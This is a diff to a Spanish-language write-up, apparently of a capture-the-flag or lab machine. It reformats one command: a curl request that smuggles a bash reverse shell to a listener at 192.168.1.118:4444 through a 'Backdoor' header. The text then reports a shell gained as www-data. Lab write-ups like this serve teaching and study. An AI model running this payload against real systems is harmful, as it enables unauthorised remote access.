@@ -40,7 +40,9 @@ Bien! Vemos que podemos ejecutar comandos de forma remota! Ahora tenemos que gan
 
 Ahora sí estamos preparados para entablar una conexión:
 
-- `curl -H "Backdoor: bash -c 'bash -i >& /dev/tcp/192.168.1.118/4444 0>&1'" http://192.168.1.118`
+```
+curl -H "Backdoor: bash -c 'bash -i >& /dev/tcp/192.168.1.118/4444 0>&1'" http://192.168.1.118
+```
 
 Bien! Hemos recibido una Shell como `www-data`!
 
